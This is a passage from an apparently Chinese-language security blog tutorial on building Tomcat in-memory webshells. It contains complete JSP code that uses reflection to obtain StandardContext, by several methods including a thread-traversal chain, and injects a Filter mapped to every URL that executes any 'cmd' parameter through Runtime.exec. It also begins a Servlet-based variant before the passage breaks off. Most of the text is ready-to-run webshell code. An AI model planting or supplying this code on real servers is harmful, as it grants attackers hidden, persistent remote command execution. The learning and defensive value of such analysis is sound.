<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig=(ApplicationFilterConfig) declaredConstructor.newInstance(standardContext,filterDef);</span><br></pre></td></tr></table></figure>

<p>2.获取到filterConfigs并修改</p>
<p>filterConfigs中存的是filter名和filterConfig的Entry</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs=(Map)configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>,filterConfig);</span><br></pre></td></tr></table></figure>



<h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><p>有了以上这些知识,就可以尝试自己写出filter型的内存马了</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先通过反射获取到context</span></span><br><span class="line"></span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Class&lt;? extends ServletContext&gt; aClass = servletContext.getClass();</span><br><span class="line">    Field appContext = aClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span><br><span class="line">    Field stdContext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参照了好几篇文章才勉强理解完,感谢这几篇文章的帮助</p>
<p><a href="https://blog.csdn.net/qq_41874930/article/details/121184952">https://blog.csdn.net/qq_41874930/article/details/121184952</a></p>
<p><a href="https://blog.csdn.net/angry_program/article/details/116661899?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165034810816780269864296%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165034810816780269864296&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-116661899.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=filter%E5%86%85%E5%AD%98%E9%A9%AC&spm=1018.2226.3001.4187">Filter内存马浅析</a></p>
<p><a href="https://blog.csdn.net/weixin_45682070/article/details/122930587?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165034810816780269864296%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165034810816780269864296&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122930587.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=filter%E5%86%85%E5%AD%98%E9%A9%AC&spm=1018.2226.3001.4187">tomcat Filter内存马</a></p>
<h3 id="获取standrandContext的方法"><a href="#获取standrandContext的方法" class="headerlink" title="获取standrandContext的方法"></a>获取standrandContext的方法</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>每加载一个Web应用就创建一个ServletContext对象来共享数据，Tomcat对ServletContext的实现为ApplicationContext，而ApplicationContext实例中包含StandardContext。那么StandardContext的获取思路大概为ServletContext-&gt;ApplicationContext-&gt;StandardContext。想要获取共享数据的对象ServletContext，先要获取携带数据的对象，例如request对象或ThreadLocal。二者有一点差异，request对象可以在不同线程内获取数据，而ThreadLocal只能在当前线程内获取数据。但是最终的ServletContext是唯一的，所以这两种获取方式理论上都可以采用。从应用范围上讲利用request对象更通用，但是如果无法直接获取request对象，可以从ThreadLocal入手</p>
<p><code>ApplicationContext</code>中有<code>StandardContext</code>类型的成员变量<code>context</code>,通过这样就能获取到对应的<code>context</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">//这里获取到的class是ApplicationContextFacade</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">        // standardContext为context接口标准实现类</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>

<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>除了上面那种方法,还在看大佬博客的时候发现了一个方法,这个方法很巧妙</p>
<p>首先</p>
<p>在jsp中可以直接写的request对象的类型是HttpServletRequest,HttpServletRequest是一个接口,通过它,getClass(),获取到当前正在运行的它的对应对象的类是RequestFacade</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420101423176.png" alt="image-20220420101423176"></p>
<p>RequestFacade中有一个成员变量Request</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420102024626.png" alt="image-20220420102024626"></p>
<p>通过该Request中的getContext()方法可以获取到当前request对应的context</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420101210413.png" alt="image-20220420101210413"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field declaredField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request request1 = (Request)declaredField.get(request);</span><br><span class="line">    StandardContext standardContext=(StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>

<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>通过ThreadLocal获取context</p>
<p>ThreadLocal是什么呢,顾名思义,就是它里面存的是当前线程才才可以访问和使用的一些变量,当然想用他里面的变量,也得先存进去不是</p>
<p>看大佬说的是因为在internalDoFilter方法调用中，将request赋值给了ThreadLocal。所以可以获取到request从而像方法二一样获取到context对象,但是这里就出现了一个令我有点不解的点,就是Filter的添加是在internalDoFilter之后,为什么可以在添加Filter之前就获取到ThreadLocal这个对象呢</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421121651249.png" alt="image-20220421121651249" style="zoom:67%;" />

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421121832745.png" alt="image-20220421121832745"></p>
<p>当ApplicationDispatcher.WRAP_SAME_OBJECT这个变量为true的时候,就会创建新的ThreadLocal并且将request对象放进去,这个值默认为false,所以通过反射修改一下</p>
<p>这个方法学习的推进遇见了麻烦,完事补上…….</p>
<h4 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h4><p>通过<code>ContextClassLoader</code>获取<code>standardContext</code></p>
<p>ContextClassLoader实际上是一个虚的概念,它的本质还是ClassLoader,只是它破坏了双亲委托机制,让子类加载器可以加载父类加载器才能加载的内容</p>
<p>tomcat的类加载机制和双亲委派机制是相反它,它是先用webappClassLoader去尝试加载某个类,找不到再交给父类加载器去加载</p>
<p>webappClassLoader显然就是这样一个ContextClassLoader</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421144335949.png" alt="image-20220421144335949"></p>
<p>采用<code>Thread.currentThread().getContextClassLoader()</code>获取到的CLassLoader是ParalleWebappClassLoader,它是<code>WebappClassLoaderBase</code>的子类,由于contextClassLoader的特性,它可以加载<code>WebappClassLoaderBase</code>的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>

<h4 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h4><p>通过Thread获取context</p>
<p>跟着这篇<a href="https://www.jianshu.com/p/e2774aa3e9ba">文章</a>学习,大概找context的路径是酱紫的</p>
<p>threads[16]-&gt;target-&gt;endpoint-&gt;handler-&gt;proto-&gt;adapter-&gt;connector-&gt;service-&gt;engine-&gt;children(map)-&gt;map(“localhost”)-&gt;StandardEngine-&gt;children(map)-&gt;map(‘’)-&gt;standardContext</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420180444920.png" alt="image-20220420180444920"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420182450812.png" alt="image-20220420182450812"></p>
<p>总之知道在哪里可以获取到context后过程其实并不难,主要的是细心一层层往下慢慢剥开,还有个问题就是说有的成员变量是在父类中的,需要多次<code>getSuperclass()</code></p>
<p>通过这种方式实现的Filter内存马</p>
<blockquote>
<p>可能是由于反射的操作过于复杂了吧,idea在多个getSuperclass后并没有跟往常一样,在getDeclatedField的时候提示变量名,而且还没有提示filed找不到的异常需要处理,只是standardContext变量需要在一开始就定义好,不然后面就会判断该变量无法读取到</p>
</blockquote>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    StandardContext standardContext=<span class="keyword">null</span>;</span><br><span class="line">    ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span><br><span class="line">    Field field=threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Thread[] threads=(Thread[])field.get(threadGroup);</span><br><span class="line">    <span class="keyword">for</span>(Thread thread:threads)&#123;</span><br><span class="line">        <span class="keyword">if</span>(thread!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//遍历线程数组,选出Acceptor的线程</span></span><br><span class="line">            String name = thread.getName();</span><br><span class="line">            System.out.println(name);</span><br><span class="line">            <span class="keyword">if</span>(thread.getName().contains(<span class="string">&quot;http&quot;</span>)&amp;&amp;thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">//获取到对应的线程</span></span><br><span class="line">                Field targetField = thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                targetField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Runnable target1 = (Runnable) targetField.get(thread);</span><br><span class="line"></span><br><span class="line">                Field endpointField = target1.getClass().getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                endpointField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object endpoint1 = endpointField.get(target1);</span><br><span class="line"></span><br><span class="line">                Field handlerField = endpoint1.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                handlerField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object handler1 = handlerField.get(endpoint1);</span><br><span class="line"></span><br><span class="line">                Field protoField = handler1.getClass().getDeclaredField(<span class="string">&quot;proto&quot;</span>);</span><br><span class="line">                protoField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object proto = protoField.get(handler1);</span><br><span class="line"></span><br><span class="line">                Field adapterField = proto.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;adapter&quot;</span>);</span><br><span class="line">                adapterField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object adapter = adapterField.get(proto);</span><br><span class="line"></span><br><span class="line">                Field connectorField = adapter.getClass().getDeclaredField(<span class="string">&quot;connector&quot;</span>);</span><br><span class="line">                connectorField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object connector = connectorField.get(adapter);</span><br><span class="line"></span><br><span class="line">                Field serviceField = connector.getClass().getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">                serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object service = serviceField.get(connector);</span><br><span class="line"></span><br><span class="line">                Field engineField = service.getClass().getDeclaredField(<span class="string">&quot;engine&quot;</span>);</span><br><span class="line">                engineField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object engine = engineField.get(service);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                Field children1 = engine.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">                children1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="comment">//这里得到的hashMap的entry 存的是域名和host的对应关系</span></span><br><span class="line">                HashMap engineMap = (HashMap) children1.get(engine);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//获取host</span></span><br><span class="line">                StandardHost standardHost=(StandardHost)engineMap.values().iterator().next();</span><br><span class="line"></span><br><span class="line">                Field declaredField = standardHost.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                HashMap contextMap = (HashMap)declaredField.get(standardHost);</span><br><span class="line"></span><br><span class="line">               standardContext = (StandardContext)contextMap.values().iterator().next();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习"></a>原理学习</h5><p>为什么可以通过Acceptor这个线程层层推进找到context呢,这就需要再学习一下了</p>
<p>由于对tomcat底层架构和java知识不足,只能先写点自己浅显的理解,之后了解足够之后再来补充</p>
<blockquote>
<p>个人理解</p>
</blockquote>
<p>在tomcat运行期间,肯定有很多线程被启动,他们都有各自要做的事情,Acceptor这个线程顾名思义,就是用来接收请求的线程,接收了请求,肯定是需要层层转发给engine-&gt;context-&gt;wrapper处理才行呢,那么这个线程中就肯定可以获取到context对象</p>
<h2 id="servlet类型的内存马"><a href="#servlet类型的内存马" class="headerlink" title="servlet类型的内存马"></a>servlet类型的内存马</h2><p>首先,跟进一些servlet的添加注册流程</p>
<p>首先在ContextConfig#webConfig()中读取xml文件信息</p>
<p>使用context#createWrapper新建一个wrapper对象,设置启动优先级,servlet的name,设置了servlet的Class</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420121557998.png" alt="image-20220420121557998"></p>
<p>并且通过addChild将其添加到context当中,</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420121642666.png" alt="image-20220420121642666"></p>
<p>然后循环遍历servletmapping添加路径和name的对应关系</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420122055271.png" alt="image-20220420122055271"></p>
<p>其实大体流程和之前的filter差不多</p>
<p>还变得简单了,原因呢就是wrapper和servlet是一一对应的关系</p>
<p>总共分为以下几步</p>
<p>1.获取到context并创建一个Wrapper对象</p>
<p>2.设置设置启动优先级,servlet的name,设置servlet对应的Class</p>
<p>3.将wrapper添加到context的children中</p>
<p>4.将路径和servlet做好映射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Servlet servlet = <span class="keyword">new</span> Servlet()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    result.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                result.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + result.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        